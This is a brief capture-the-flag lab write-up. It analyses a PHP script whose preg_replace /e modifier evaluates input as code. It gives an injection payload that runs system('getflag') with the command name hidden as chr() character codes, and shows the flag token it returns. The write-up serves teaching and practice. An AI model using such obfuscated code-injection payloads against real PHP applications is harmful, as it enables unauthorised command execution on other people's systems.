##### 1 - Analyze binary file

``./level06``
>PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/level06/level06.php on line 4

``cat level06.php``
````
#!/usr/bin/php
<?php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
$r = x($argv[1], $argv[2]); print $r;
?>
````

Program need a file in argument

----

##### 2 - Inject code

For x preg_replace use /e so expression is use as PHP code and opens a vulnerability.


``echo '[x {${system(implode(array(chr(103),chr(101),chr(116),chr(102),chr(108),chr(97),chr(103))))}}]' > /tmp/lvl06``


**103 (g), 101 (e), 116 (t), 102 (f), 108 (l), 97 (a), 103 (g)**

----

##### 3 - Getting the flag

``./level06 /tmp/lvl06``
>Check flag.Here is your token : **wiok45aaoguiboiki2tuin6ub**
>PHP Notice:  Undefined variable: Check flag.Here is your token : **wiok45aaoguiboiki2tuin6ub** in /home/user/level06/level06.php(4) : regexp code on line 1
